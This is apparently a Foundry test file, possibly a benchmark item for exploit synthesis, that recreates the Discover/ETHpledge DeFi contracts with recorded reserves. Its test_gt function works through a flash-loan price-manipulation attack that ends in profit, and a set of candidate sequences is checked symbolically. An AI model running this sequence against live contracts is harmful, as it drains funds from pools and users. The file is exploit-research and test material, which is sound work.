// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Discover.sol";
import "./ETHpledge.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract DiscoverTest is Test, BlockLoader {
    USDT usdt;
    Discover disc;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    ETHpledge ethpledge;
    address attacker;
    address constant owner = address(0x123456);
    uint256 blockTimestamp = 1654501818;
    uint112 reserve0pair = 19811554285664651588959;
    uint112 reserve1pair = 12147765912566297044558;
    uint32 blockTimestampLastpair = 1654497610;
    uint256 kLastpair = 240657614061763162729453454536640212219454075;
    uint256 price0CumulativeLastpair = 2745108143450717659830230984376055006264;
    uint256 price1CumulativeLastpair = 5093292101492579051002459678125122695956;
    uint256 totalSupplydisc = 99999771592634687573343730;
    uint256 balanceOfdiscpair = 12147765912566297044558;
    uint256 balanceOfdiscattacker = 0;
    uint256 balanceOfdiscdisc = 0;
    uint256 balanceOfdiscethpledge = 603644007472699128296549;
    uint256 totalSupplyusdt = 4979997922172658408539526181;
    uint256 balanceOfusdtpair = 19811554285664651588959;
    uint256 balanceOfusdtattacker = 4000000000000000000;
    uint256 balanceOfusdtdisc = 0;
    uint256 balanceOfusdtethpledge = 17359200000000000000000;

    function setUp() public {
        vm.warp(blockTimestamp);
        attacker = address(this);
        vm.startPrank(owner);
        usdt = new USDT();
        disc = new Discover();
        pair = new UniswapV2Pair(
            address(usdt),
            address(disc),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));
        ethpledge = new ETHpledge(
            address(usdt),
            address(disc),
            address(0xdead),
            address(0xdead),
            address(pair)
        );
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        disc.transfer(address(pair), balanceOfdiscpair);
        usdt.transfer(address(ethpledge), balanceOfusdtethpledge);
        disc.transfer(address(ethpledge), balanceOfdiscethpledge);
        usdt.transfer(attacker, balanceOfusdtattacker);
        usdt.approve(attacker, UINT256_MAX);
        disc.approve(attacker, UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(usdt),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Disc Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(disc),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(disc),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(pair),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Ethpledge Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(ethpledge),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(disc),
            address(ethpledge),
            disc.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
        queryERC20BalanceDecimals(address(disc), attacker, disc.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_usdt(uint256 amount) internal {
        usdt.transferFrom(owner, attacker, amount);
    }

    function payback_usdt(uint256 amount) internal {
        usdt.transfer(owner, amount);
    }

    function borrow_disc(uint256 amount) internal {
        disc.transferFrom(owner, attacker, amount);
    }

    function payback_disc(uint256 amount) internal {
        disc.transfer(owner, amount);
    }

    function swap_pair_usdt_disc(uint256 amount) internal {
        usdt.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(disc);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_disc_usdt(uint256 amount) internal {
        disc.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(disc);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function swap_ethpledge_usdt_disc(uint256 amount) internal {
        usdt.approve(address(ethpledge), UINT256_MAX);
        ethpledge.pledgein(amount);
    }

    function test_gt() public {
        borrow_disc(24000e18);
        printBalance("After step0 ");
        swap_pair_disc_usdt(disc.balanceOf(attacker));
        printBalance("After step1 ");
        swap_ethpledge_usdt_disc(5000e18);
        printBalance("After step2 ");
        payback_disc((24000e18 * 1003) / 1000);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == amt0 + 72000000000000001498);
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_disc(amt3);
        assert(!attackGoal());
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == amt0 + 72000000000000001498);
        borrow_usdt(amt0);
        swap_pair_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == amt0 + 72000000000000001498);
        borrow_usdt(amt0);
        swap_ethpledge_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        payback_usdt(amt3);
        assert(!attackGoal());
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == amt0 + 72000000000000001498);
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_pair_usdt_disc(amt2);
        payback_disc(amt3);
        assert(!attackGoal());
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.assume(amt3 == amt0 + 72000000000000001498);
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_disc(amt3);
        assert(!attackGoal());
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 72000000000000001498);
        borrow_usdt(amt0);
        swap_pair_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        swap_pair_disc_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 72000000000000001498);
        borrow_usdt(amt0);
        swap_ethpledge_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        swap_pair_disc_usdt(amt3);
        payback_usdt(amt4);
        assert(!attackGoal());
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 72000000000000001498);
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_pair_usdt_disc(amt2);
        swap_pair_disc_usdt(amt3);
        payback_disc(amt4);
        assert(!attackGoal());
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 72000000000000001498);
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        swap_pair_disc_usdt(amt3);
        payback_disc(amt4);
        assert(!attackGoal());
    }
}
